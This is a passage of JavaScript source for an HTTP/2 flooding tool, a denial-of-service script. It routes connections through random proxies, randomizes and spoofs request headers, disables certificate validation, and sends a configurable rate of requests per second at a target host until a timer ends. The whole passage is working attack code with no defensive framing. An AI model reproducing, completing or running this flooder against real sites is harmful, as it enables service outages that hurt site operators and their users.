    headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
    headers["sec-fetch-user"] = "1";
    headers["upgrade-insecure-requests"] = "1";
    headers["user-agent"] = newua;
    headers["x-requested-with"] = "XMLHttpRequest";

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
        headers[":authority"] = parsedTarget.host
        headers["x-forwarded-for"] = parsedProxy[0];
        headers["x-forwarded-proto"] = "https";
        const proxyOptions = {
            host: parsedProxy[0],
            port: parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 100
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return
            connection.setKeepAlive(true, 90000);
            connection.setNoDelay(true);

            const settings = {
                enablePush: false,
                initialWindowSize: 1073741823
            };

            const tlsOptions = {
                port: 443,
                ALPNProtocols: [
                    "h2", "spdy/3.1" , "http/1.1"
                ],
                secure: true,
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                rejectUnauthorized: false,
                servername: url.hostname,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                secureOptions: secureOptions,
                secureContext: secureContext,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 100000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                },
                maxSessionMemory: 3333,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn,
                socket: connection,
            });

            client.settings({
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            });

            client.setMaxListeners(0);
            client.settings(settings);

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const request = client.request(headers)

                            .on("response", response => {
                                request.close();
                                request.destroy();
                                return
                            });

                        request.end();
                    }
                }, 1000);
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
                return
            });

            client.on("error", error => {
                client.destroy();
                connection.destroy();
                return
            });
        });
    }

    const KillScript = () => process.exit();
    setTimeout(KillScript, args.time * 1000);